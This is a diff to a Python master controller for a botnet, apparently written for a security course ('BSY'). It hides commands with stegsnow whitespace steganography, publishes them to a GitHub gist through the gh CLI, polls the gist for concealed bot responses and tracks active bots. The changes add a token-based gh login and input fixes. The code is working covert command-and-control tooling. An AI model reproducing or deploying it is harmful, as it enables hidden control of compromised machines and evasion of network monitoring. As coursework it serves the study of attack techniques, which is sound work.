@@ -3,6 +3,7 @@ import time
 import threading
 import base64
 
+######## EDITABLE USER VARIABLES ###################################
 GIST_ID = "799938c0850a634dfe9ce73436a00de0"
 
 # TIMES
@@ -10,7 +11,10 @@ TIMEOUT_RESPONSE = 10 # timeout for waiting for response
 TIMEOUT_ALIVE = 10 # timeout for checking if bot is alive
 PERIOD_ALIVE = 60 # period between alive checks
 
-INSTALL_TOOLS = True # Are gh and stegsnow already installed
+INSTALL_TOOLS = True # Do gh and stegsnow need to be installed
+LOGIN = False # login needed
+
+############################################################3
 
 # used file names
 coverage_fn  = 'short0.txt'
@@ -84,9 +88,6 @@ def check_alive(period):
         sending = False
         time.sleep(period)
 
-def send_command(c):
-    pass
-
 if __name__ == '__main__':
     print(f" ___________________ \n\nWelcome to the BSY controll bot interface communicating at gist {GIST_ID}. \nThe commands are supported in the following format:"\
     "\n  <i> <command> <arguments>\n\t <i> is index of bot to be comanded or 'a' meaning all bots and 0 is reserved for master\n\t "\
@@ -100,6 +101,11 @@ if __name__ == '__main__':
 
     if INSTALL_TOOLS:
         install_tools()
+
+    if LOGIN:
+        print("=> Logging into gist.github.")
+        os.system(f'gh auth login --with-token < key.txt')
+
     # start communication with init command for all bots
     os.system(f'stegsnow -C -m "a init" {coverage_fn} {command_fn} 2> steg.out') #conceal init command into coverage file
     os.system(f"gh gist edit {GIST_ID} -a {command_fn}") # send command to channel
@@ -115,11 +121,11 @@ if __name__ == '__main__':
             print("=> Waiting for finishing the check if the bots are alive.\n")
             while sending:
                 pass
-        print(f"Acitve bots are: {str(active_bots)}")
+        print(f"Acitve bots are: {str(active_bots)}",flush=True)
 
-        command = input("Insert command:\n") #wait for command
+        command = input("Insert command (or pres enter to refresh active_bots):\n") #wait for command
         cm_parts = command.split()
-        print('\n')
+        #print('\n')
 
         if len(cm_parts) > 1 and cm_parts[1] in commands: #check if it is known command
             if cm_parts[0] == '0':
@@ -166,6 +172,7 @@ if __name__ == '__main__':
                 response_fn = f'example{i}.txt'
                 start_t = time.time()
                 timeouted = False
+
                 while True: # check for response change
                     os.system(f"gh gist view {GIST_ID} -f {response_fn} > {temp_fn}")
                     response = os.popen(f"stegsnow -C {temp_fn}").read()
@@ -209,11 +216,14 @@ if __name__ == '__main__':
 
 
         else:
-            if cm_parts[0] == 'qq':
+            if cm_parts and cm_parts[0] == 'qq':
                 print("Command qq received, terminating the master bot.")
                 checking = False
                 os.system(f"rm {command_fn} && rm {temp_fn}")
                 break;
-            print("Unknown command, not sending.")
+            if cm_parts:
+                print("Unknown command, not sending.")
+            elif not sending:
+                print('\033[4A') #return cursor back to overwrite active bots
     #t1.join()
     print("Program ending.")
